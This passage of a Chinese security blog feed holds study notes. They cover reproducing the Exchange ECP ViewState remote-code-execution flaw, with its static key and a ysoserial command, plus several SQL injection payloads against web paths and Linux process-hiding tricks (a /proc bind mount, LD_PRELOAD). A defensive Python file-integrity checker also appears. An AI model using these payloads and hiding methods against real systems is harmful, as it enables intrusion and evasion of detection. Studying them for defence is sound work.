ECP组件中发现，邮件服务在安装的过程中不会随机生成秘钥，也就是说所有默认安装的Exchange服务器中的validationKey和decryptionKey的值都是相同的，攻击者可以利用静态秘钥对服务器发起攻击，在服务器中以SYSTEM权限远程执行代码。</p><h2 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h2><p>目前github中已经有利用poc脚本：POC1,POC2，脚本的实现原理基本相同，其中都需要用到ysoserial.exe对payload进行反序列化。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>1、需要变量<br>想要利用该漏洞，我们需要四个参数，分别为：</p><p>–validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</p><p>–validationalg &#x3D; SHA1（默认，漏洞产生原因）</p><p>–generator&#x3D;B97B4E27（基本默认）</p><p>–viewstateuserkey &#x3D; ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</p><p>在这四个变量中，前两个为默认固定，viewstateuserkey和generator的值需要从经过身份验证的session中收集。viewstateuserkey可以从ASP.NET的_SessionID cookie中获取，而generator可以在一个隐藏字段__VIEWSTATEGENERATOR中找到。所有这些都可以通过浏览器中的工具轻松获取。</p><p>2、获取viewstateuserkey和generator值<br>在正常登录后访问 &#x2F;ecp&#x2F;default.aspx 页面。使用F12开发者工具的Network选项，刷新页面重新发送请求，找到登录时&#x2F;ecp&#x2F;default.aspx的原始响应。</p><p>在Headers选项卡找到ASP.NET_SessionId的cookie：</p><p>在Response选项卡搜索__VIEWSTATEGENERATOR获取字段值：</p><p>如果未找到此字段不必慌张，直接使用默认值B97B4E27 即可。</p><p>3、使用工具生成payload<br>使用ysoserial.net工具生成反序列化payload。 工具下载地址：<a href="https://github.com/pwntester/ysoserial.net/">https://github.com/pwntester/ysoserial.net/</a></p><p>生成payload命令：</p><p>ysoserial.exe-p ViewState -g TextFormattingRunProperties -c “calc.exe”–validationalg&#x3D;”SHA1”–validationkey&#x3D;”CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF”–generator&#x3D;”B97B4E27” –viewstateuserkey&#x3D;”d673d1a4-1794-403e-ab96-e283ca880ef2”–isdebug –islegacy<br>4、构造攻击地址<br>在生成完payload代码后，需要对该代码进行URL Encode编码构造一个URL</p><p>&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEGENERATOR&#x3D;<generator>&amp;__VIEWSTATE&#x3D;<ViewState><br>将最开始获得的__VIEWSTATEGENERATOR值替换<generator>，将URL Encode编码后的payload替换<ViewState>。</p><h1 id="freebuf积累"><a href="#freebuf积累" class="headerlink" title="freebuf积累"></a>freebuf积累</h1><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><blockquote><p><a href="https://www.freebuf.com/articles/system/229209.html">https://www.freebuf.com/articles/system/229209.html</a></p></blockquote><h2 id="突破正则绕WAF"><a href="#突破正则绕WAF" class="headerlink" title="突破正则绕WAF"></a>突破正则绕WAF</h2><blockquote><p><a href="https://www.freebuf.com/vuls/229300.html">https://www.freebuf.com/vuls/229300.html</a></p></blockquote><h2 id="webshell隐藏"><a href="#webshell隐藏" class="headerlink" title="webshell隐藏"></a>webshell隐藏</h2><blockquote><p><a href="https://www.freebuf.com/articles/web/229649.html">https://www.freebuf.com/articles/web/229649.html</a></p></blockquote><h1 id="微博技巧"><a href="#微博技巧" class="headerlink" title="微博技巧"></a>微博技巧</h1><h2 id="网页版微博按时间排序"><a href="#网页版微博按时间排序" class="headerlink" title="网页版微博按时间排序"></a>网页版微博按时间排序</h2><p>如果网站的url链接里有”is_hot&#x3D;1”，将其改为”is_all&#x3D;1”</p><p>如果没有”is_hot&#x3D;1”，那么：</p><p>如果网页的url链接里没有”?”，就在网址最后面加上?is_all&#x3D;1</p><p>如果网页的url链接里有”?”，就在网址最后面加上&amp;is_all&#x3D;1</p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="sql盲注payload"><a href="#sql盲注payload" class="headerlink" title="sql盲注payload"></a>sql盲注payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ac=search&amp;at=taglist&amp;tagkey=ANONY%27,tags) or did&gt;1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t </span><br></pre></td></tr></table></figure><h2 id="like-regexp正则"><a href="#like-regexp正则" class="headerlink" title="like_regexp正则"></a>like_regexp正则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=5565e19cb72447479c777a99c0e39ddf&amp;sqlwhere=  and PMEMSBXQSQ_SQDW in (select CODE from PMMDDW p where p.PATH like (select PATH || &#x27;%&#x27; from PMMDDW d where d.CODE=&#x27;Z01050050020180000&#x27;))  and  PMEMSBXQSQ_XMBH=&#x27;010000503000&#x27;&amp;title=........................</span><br></pre></td></tr></table></figure><h2 id="orderbygroup排序"><a href="#orderbygroup排序" class="headerlink" title="orderbygroup排序"></a>orderbygroup排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/search.php?chid=1&amp;carsfullname=aa&amp;searchmode=subject&amp;orderby=aid and (select 1 from (select count(*),concat(&quot;Anonymous08CMS_InjTest&quot;,floor(rand(0)*2))x from information_schema.tables group by x)a)&amp;addno=0&amp;ccid8=366 </span><br></pre></td></tr></table></figure><h2 id="exists存在判断"><a href="#exists存在判断" class="headerlink" title="exists存在判断"></a>exists存在判断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/movie/onunload.php?serverid=1 and exists(select * from (select * from(select name_const(0x416e6f6e796d6f75735365635f506870434d533230303754657374,0))a join (select name_const(0x416e6f6e796d6f75735365635f506870434d533230303754657374,0))b)c) </span><br></pre></td></tr></table></figure><h2 id="bigint"><a href="#bigint" class="headerlink" title="bigint"></a>bigint</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/yhpzgc/cart.php?act=addcart&amp;attr[]=12345) and (select 1 from(select count(*),concat(0x616e6f6e795f74657374,0x7c,(select (Select version()) from information_schema.tables limit 0,1),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)# and (2)=(2</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;慢慢积累，慢慢学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="freebuf" scheme="http://example.com/tags/freebuf/"/>
    
    <category term="exp收集" scheme="http://example.com/tags/exp%E6%94%B6%E9%9B%86/"/>
    
    <category term="webshell隐藏" scheme="http://example.com/tags/webshell%E9%9A%90%E8%97%8F/"/>
    
    <category term="网页微博排序" scheme="http://example.com/tags/%E7%BD%91%E9%A1%B5%E5%BE%AE%E5%8D%9A%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>filecheck</title>
    <link href="http://example.com/2020/03/19/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1-%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9D%97/"/>
    <id>http://example.com/2020/03/19/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1-%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9D%97/</id>
    <published>2020-03-19T08:15:57.000Z</published>
    <updated>2020-03-19T10:35:47.638Z</updated>
    
    <content type="html"><![CDATA[<p>python-毕设-demo</p><span id="more"></span><h1 id="FileCheck-0-1"><a href="#FileCheck-0-1" class="headerlink" title="FileCheck 0.1"></a>FileCheck 0.1</h1><p>本脚本旨在对指定监控目录进行文件hash记录，定时运行，发现文件替换、修改等后门可疑程序。</p><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p>熊猫在路上</p><h2 id="Support"><a href="#Support" class="headerlink" title="Support"></a>Support</h2><p>满足如下安全需求</p><pre><code>1、支持自定义文件目录监控2、支持目录递归监控3、支持文件hash记录并比较4、支持高危文件修改报警5、支持prelink服务排除</code></pre><p>技术细节如下：</p><pre><code>1、针对自定义的路径进行递归遍历操作，并对文件进行hash保存2、当程序运行时先判断hash文件是否存在，不存在则创建，存在则获取当前文件hash与之比较3、自定义高危文件名称，当修改时则进行高危日志打印4、prelink服务会主动修改二进制文件，并记录prelink日志，当存在hash变动时，进行prelink日志检索，减少误报5、相关告警日志默认存储在/var/log/filecheck.log文件中6、hash文件保存在脚本目录名hash_db.txt中</code></pre><h2 id="Test-Environment"><a href="#Test-Environment" class="headerlink" title="Test Environment"></a>Test Environment</h2><blockquote><p>centos 7</p><p>python 2.6-3+</p></blockquote><h2 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h2><pre><code>FileCheck----FileCheck.py      #程序主程序</code></pre><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><pre><code>脚本放置在任意目录中1）$ python FileCheck.py 尝试运行并生成hash_db.txt2）配置crontab信息，定时执行，如5分钟一次。3）$ cat /var/log/filecheck.log 查阅告警日志</code></pre><h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><p>配置参数：FileCheck.py</p><pre><code># 文件完整性检测目录，并递归子目录CHECK_DIR = [&#39;/bin/&#39;, &#39;/sbin/&#39;, &#39;/usr/bin/&#39;, &#39;/usr/sbin/&#39;, &#39;/usr/local/sbin/&#39;, &#39;/usr/local/bin/&#39;]# 重要高危告警文件名称HEIGH_FILE_ALARM = [&#39;login&#39;, &#39;ls&#39;, &#39;ps&#39;, &#39;ifconfig&#39;, &#39;du&#39;, &#39;find&#39;, &#39;netstat&#39;, &#39;bash&#39;]# hash文件存储名称HASH_DB = sys.path[0] + &#39;/hash_db.txt&#39;# 日志告警文件存储位置ALARM_LOG = &#39;/var/log/filecheck.log&#39;# prelink服务会修改二进制文件，此处保存prelink服务的相关日志路径PRELINK_LOG_PATH = [&#39;/var/log/prelink/prelink.log&#39;, &#39;/var/log/prelink.log&#39;]</code></pre><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># author：  熊猫在路上</span><br><span class="line"># 对系统主要文件夹进行监控，并把修改、创建的文件进行日志打印，</span><br><span class="line"># 当修改或者创建高危文件时，进行日志打印，但并不覆写hash库，至到人工干预为止。</span><br><span class="line"># 当修改或者创建非高危文件时，进行日志打印，并把当前文件hash覆盖原有文件。</span><br><span class="line"># 排除prelink服务对二进制文件修改对结果进行干扰，每次排查都会排除prelink的操作</span><br><span class="line"># 发现Prelink服务会主动修改二进制文件，是为了系统加速各个程序的启动速度予以修改程序，进而文件的hash也就变动了。为此我兼容了prelink服务。</span><br><span class="line"></span><br><span class="line">import os, sys, logging, time</span><br><span class="line"></span><br><span class="line"># 文件完整性检测目录，并递归子目录</span><br><span class="line">CHECK_DIR = [&#x27;/bin/&#x27;, &#x27;/sbin/&#x27;, &#x27;/usr/bin/&#x27;, &#x27;/usr/sbin/&#x27;, &#x27;/usr/local/sbin/&#x27;, &#x27;/usr/local/bin/&#x27;]</span><br><span class="line"># 重要高危告警文件名称</span><br><span class="line">HEIGH_FILE_ALARM = [&#x27;login&#x27;, &#x27;ls&#x27;, &#x27;ps&#x27;, &#x27;ifconfig&#x27;, &#x27;du&#x27;, &#x27;find&#x27;, &#x27;netstat&#x27;, &#x27;bash&#x27;]</span><br><span class="line"># hash文件存储名称</span><br><span class="line">HASH_DB = sys.path[0] + &#x27;/hash_db.txt&#x27;</span><br><span class="line"># 日志告警文件存储位置</span><br><span class="line">ALARM_LOG = &#x27;/var/log/filecheck.log&#x27;</span><br><span class="line"># prelink服务会修改二进制文件，此处保存prelink服务的相关日志路径</span><br><span class="line">PRELINK_LOG_PATH = [&#x27;/var/log/prelink/prelink.log&#x27;, &#x27;/var/log/prelink.log&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 计算一个文件的hash值</span><br><span class="line"># 返回hash值字符串</span><br><span class="line">def file_hash(file_path):</span><br><span class="line">    import hashlib</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    size = 102400</span><br><span class="line">    fp = open(file_path, &#x27;rb&#x27;)</span><br><span class="line">    while True:</span><br><span class="line">        content = fp.read(size)</span><br><span class="line">        if not content:</span><br><span class="line">            break</span><br><span class="line">        md5obj.update(content)</span><br><span class="line">    fp.close()</span><br><span class="line">    return md5obj.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取一个目录下的所有文件HASH值</span><br><span class="line"># 返回内容hash_list_content，包含[[文件路径，hash值],[文件路径，hash值]]</span><br><span class="line">def dir_hash(path):</span><br><span class="line">    hash_list_content = []</span><br><span class="line">    for root, dirs, files in os.walk(path, topdown=True):</span><br><span class="line">        for filename in files:</span><br><span class="line">            # 存在软链指向真实文件不存在现象</span><br><span class="line">            if os.path.exists(os.path.join(root, filename)):</span><br><span class="line">                hash_list = []</span><br><span class="line">                hash_list.append(os.path.join(root, filename))  # 保存文件绝对路径</span><br><span class="line">                hash_list.append(file_hash(os.path.join(root, filename)))  # 保存文件hash</span><br><span class="line">                hash_list_content.append(hash_list)</span><br><span class="line">    return hash_list_content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取存储的hash值文件</span><br><span class="line"># 返回内容history_hash_list_content，包含[[],[]]</span><br><span class="line">def get_history_hash_list():</span><br><span class="line">    if not os.path.exists(HASH_DB):</span><br><span class="line">        write_hash_db(&quot;Initialization&quot;)</span><br><span class="line">        return &quot;&quot;, &quot;&quot;</span><br><span class="line">    if os.path.getsize(HASH_DB) == 0:</span><br><span class="line">        write_hash_db(&quot;Initialization&quot;)</span><br><span class="line">        return &quot;&quot;, &quot;&quot;</span><br><span class="line">    # 获取hash文件内容到数据组中</span><br><span class="line">    history_hash_list_content = []</span><br><span class="line">    # 获取文件路绝对路径到数组中</span><br><span class="line">    history_file_path_list = []</span><br><span class="line">    for line in open(HASH_DB):</span><br><span class="line">        if line != &quot;&quot; or line != None:</span><br><span class="line">            tmp_hash = []</span><br><span class="line">            tmp_hash.append(line.split(&#x27;||&#x27;)[0].split(&#x27;\n&#x27;)[0])  # 文件绝对路径</span><br><span class="line">            tmp_hash.append(line.split(&#x27;||&#x27;)[1].split(&#x27;\n&#x27;)[0])  # 文件hash</span><br><span class="line">            history_hash_list_content.append(tmp_hash)</span><br><span class="line">            history_file_path_list.append(line.split(&#x27;||&#x27;)[0].split(&#x27;\n&#x27;)[0])</span><br><span class="line">    return history_hash_list_content, history_file_path_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 写hash数据文件</span><br><span class="line"># 传入参数为操作类型，</span><br><span class="line"># Initialization为初始化hash文件，</span><br><span class="line"># Coverage为非高危文件变动时，覆盖原hash文件</span><br><span class="line">def write_hash_db(type):</span><br><span class="line">    time_string = time.time()</span><br><span class="line">    if type == &quot;Initialization&quot;:</span><br><span class="line">        if not os.path.exists(HASH_DB):</span><br><span class="line">            os.mknod(HASH_DB)</span><br><span class="line">        if os.path.getsize(HASH_DB) == 0:</span><br><span class="line">            f = open(HASH_DB, &#x27;w&#x27;)</span><br><span class="line">            for check_dir in CHECK_DIR:</span><br><span class="line">                for hash_list in dir_hash(check_dir):</span><br><span class="line">                    f.write(hash_list[0] + &quot;||&quot; + hash_list[1] + &quot;||&quot; + str(time_string) + &quot;\n&quot;)</span><br><span class="line">            f.close()</span><br><span class="line">    if type == &quot;Coverage&quot;:</span><br><span class="line">        if os.path.exists(HASH_DB):</span><br><span class="line">            os.remove(HASH_DB)</span><br><span class="line">            os.mknod(HASH_DB)</span><br><span class="line">        f = open(HASH_DB, &#x27;w&#x27;)</span><br><span class="line">        for check_dir in CHECK_DIR:</span><br><span class="line">            for hash_list in dir_hash(check_dir):</span><br><span class="line">                f.write(hash_list[0] + &quot;||&quot; + hash_list[1] + &quot;||&quot; + str(time_string) + &quot;\n&quot;)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测操作类型，判断出现文件变动时，是修改还是创建</span><br><span class="line"># True为修改</span><br><span class="line"># Flase为创建</span><br><span class="line">def check_operation_type(file_path, history_file_path_list):</span><br><span class="line">    if file_path in history_file_path_list:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测是否存在prelink服务</span><br><span class="line"># 返回服务真假，和日志内容</span><br><span class="line">def check_prelink_server():</span><br><span class="line">    for path in PRELINK_LOG_PATH:</span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            file_object = open(path)</span><br><span class="line">            try:</span><br><span class="line">                all_the_text = file_object.read()</span><br><span class="line">            finally:</span><br><span class="line">                file_object.close()</span><br><span class="line">            return True, all_the_text</span><br><span class="line">    return False, &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测相对应目录的hash是否进行了变化</span><br><span class="line">def check_dir_hash():</span><br><span class="line">    # 判断是否出现文件变动</span><br><span class="line">    HASH_FILE_TYPE = False</span><br><span class="line">    # 判断是否出现了高危文件变动</span><br><span class="line">    HIGH_OPERATION_ALARM = False</span><br><span class="line">    # 最新hash文件列表</span><br><span class="line">    current_hash_list_content = []</span><br><span class="line"></span><br><span class="line">    # 初始化日志接口</span><br><span class="line">    logger = loging()</span><br><span class="line">    # 获取HASH库文件列表</span><br><span class="line">    history_hash_list_content, history_file_path_list = get_history_hash_list()</span><br><span class="line">    if len(history_hash_list_content) == 0 or len(history_file_path_list) == 0:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 判断是否存在prelink服务，并返回内容</span><br><span class="line">    PRELINK_SERVER, prelingk_log = check_prelink_server()</span><br><span class="line"></span><br><span class="line">    # 开始针对监控目录进行检测</span><br><span class="line">    for check_dir in CHECK_DIR:</span><br><span class="line">        try:</span><br><span class="line">            current_hash_list_content = dir_hash(check_dir)</span><br><span class="line">            for hash_list in current_hash_list_content:</span><br><span class="line">                # 判断是否存在hash记录</span><br><span class="line">                if not hash_list in history_hash_list_content:</span><br><span class="line">                    HASH_FILE_TYPE = True</span><br><span class="line">                    # 判断是否是prelink服务更新</span><br><span class="line">                    if PRELINK_SERVER:</span><br><span class="line">                        if len(prelingk_log) &gt; 0:</span><br><span class="line">                            # 判断是否存在prelink此条日志</span><br><span class="line">                            if prelingk_log.find(hash_list[0]) &gt; 0:</span><br><span class="line">                                continue</span><br><span class="line">                    # 判断是否为高危，高危的话不执行覆盖操作</span><br><span class="line">                    if hash_list[0].split(&#x27;/&#x27;)[-1].lower() in HEIGH_FILE_ALARM:</span><br><span class="line">                        HIGH_OPERATION_ALARM = False</span><br><span class="line">                        if check_operation_type(hash_list[0], history_file_path_list):</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Edit, 风险等级:High, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">                        else:</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Create, 风险等级:High, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">                    else:</span><br><span class="line">                        if check_operation_type(hash_list[0], history_file_path_list):</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Edit, 风险等级:Medium, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">                        else:</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Create, 风险等级:Medium, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    if HASH_FILE_TYPE and (not HIGH_OPERATION_ALARM):</span><br><span class="line">        write_hash_db(&quot;Coverage&quot;)</span><br><span class="line"></span><br><span class="line">    #打一条垃圾日志为了兼容syslog-ng最后一条日志会及时更新到splunk</span><br><span class="line">    if HASH_FILE_TYPE:</span><br><span class="line">        logger.info(&quot;文件:无, 操作:无, 风险等级:Info, MD5为:无&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 日志输出到指定文件，用于syslog打印</span><br><span class="line">def loging():</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">    logger = logging.getLogger(&#x27;FileCheck&#x27;)</span><br><span class="line">    fh = logging.FileHandler(ALARM_LOG)</span><br><span class="line">    fh.setLevel(logging.INFO)</span><br><span class="line">    formatter = logging.Formatter(&#x27;%(asctime)s - %(message)s&#x27;)</span><br><span class="line">    fh.setFormatter(formatter)</span><br><span class="line">    logger.addHandler(fh)</span><br><span class="line">    return logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if sys.version_info &lt; (2, 5):</span><br><span class="line">        print &quot;python version low&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line">    check_dir_hash()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;python-毕设-demo&lt;/p&gt;</summary>
    
    
    
    <category term="demo" scheme="http://example.com/categories/demo/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="毕业设计" scheme="http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>进程隐藏技术</title>
    <link href="http://example.com/2020/03/19/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF--%E5%A4%A7%E4%BD%AC/"/>
    <id>http://example.com/2020/03/19/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF--%E5%A4%A7%E4%BD%AC/</id>
    <published>2020-03-19T08:15:57.000Z</published>
    <updated>2020-03-19T10:34:57.145Z</updated>
    
    <content type="html"><![CDATA[<p>学习大佬的笔记</p><span id="more"></span><p>恶意程序的目的无外乎以下四种：</p><ol><li>权限提升</li><li>远程控制</li><li>资源消耗</li><li>信息窃取</li></ol><p>而恶意程序只有在运行起来后才是有害的，并不是说一个危险程序放在那就是有害的，那只能叫做潜在威胁。而这些能够执行的恶意程序大概分类也就是三种：</p><ul><li>应用级</li><li>内核级</li><li>硬件级</li></ul><blockquote><p>以下研究皆无需重编译内核。</p></blockquote><h2 id="应用级-–-gt-进程隐藏"><a href="#应用级-–-gt-进程隐藏" class="headerlink" title="应用级 –&gt; 进程隐藏"></a>应用级 –&gt; 进程隐藏</h2><p>目的：让<code>ps</code>，<code>top</code>之类的命令无法查到相关进程</p><blockquote><p>简单的替换或者修改进程名这种手段就不值得提起，检测上无非就是MD5之类的恒定值对比</p></blockquote><h3 id="隐藏-proc-PID文件夹"><a href="#隐藏-proc-PID文件夹" class="headerlink" title="隐藏/proc/PID文件夹"></a>隐藏<code>/proc/PID</code>文件夹</h3><p><code>/proc</code>是一个<code>伪文件系统</code>，只存在在内核中，不占用外存空间，以文件系统的方式为访问系统内核数据的操作提供接口，而在<code>/proc</code>中，每一个进程都有一个相应的文件，以<code>PID号</code>命名。而<code>ps</code>，<code>top</code>等命令都是针对<code>/proc</code>下的文件夹做查询从而输出结果，因此，只需要隐藏进程对应的文件，即可达到隐藏进程的目的。 创建一个空文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir .hidden</span><br></pre></td></tr></table></figure><p>挂载此目录到对应的<code>/proc/PID</code>下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind .hidden /proc/PID</span><br></pre></td></tr></table></figure><p>检测方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/$$/mountinfo</span><br></pre></td></tr></table></figure><h3 id="劫持lib库"><a href="#劫持lib库" class="headerlink" title="劫持lib库"></a>劫持lib库</h3><p>劫持lib库也就是众所周知的<code>LD_PRELOAD</code>攻击方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The answer is LD_PRELOAD, this is a environment variable for GUN-Linker.It is used to indicated some pre-load shared libraries.This meaning that functions in this libraries will get a higher priority than normal libraries.Normally, we use this technique just want to intercept some functions.So we can do some other thing( evil thing?)above the original function.</span><br></pre></td></tr></table></figure><p>关于库的详细信息可以看<a href="https://www.ibm.com/developerworks/cn/linux/l-dynamic-libraries/index.html">Linux动态库剖析</a> 